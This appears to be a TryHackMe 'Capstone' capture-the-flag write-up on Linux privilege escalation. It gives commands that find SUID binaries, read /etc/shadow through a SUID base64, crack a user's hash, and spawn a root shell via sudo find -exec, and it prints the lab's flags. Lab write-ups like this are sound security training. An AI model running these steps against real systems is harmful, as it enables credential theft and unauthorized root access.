---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/capstone/","tags":["CTF","write-up","SUID","sudo-l"]}
---


---
# Privilege Escalation
## Check for SUID files
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```
We found `base64`
![Pasted image 20240819181358.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819181358.png)
## Use https://gtfobins.github.io/ to exploit it.
We can read any file, we read `/etc/shadow` to see the hash of other users.
```shell
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```
![Pasted image 20240819181615.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819181615.png)
## On our machine crack the hash missy
Create a file passwd, copy the missy line of passwd
![Pasted image 20240819181914.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819181914.png)
Create the shadow, copy the missy line of shadow
![Pasted image 20240819182033.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819182033.png)
Unshadow the file using `unshadow` to the unshadowed file
```shell
unshadow passwd shadow > unshadowed
```
Crack the unshadowed file
![Pasted image 20240819182246.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819182246.png)
## Get the first flag
Login as missy
```shell
su missy
```
The flag is on `/home/missy/Documents`
![Pasted image 20240819182541.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819182541.png)
> [!check]- flag1.txt
> THM-42828719920544
## Escalate to root

Check `sudo -l` for missy
![Pasted image 20240819183619.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819183619.png)
Leverage `find`
```shell
sudo find / etc/passwd -exec /bin/bash \;
```
![Pasted image 20240819183906.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819183906.png)
We are root now
## Get the second flag
![Pasted image 20240819184137.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819184137.png)
> [!check]- flag2.txt
> THM-168824782390238
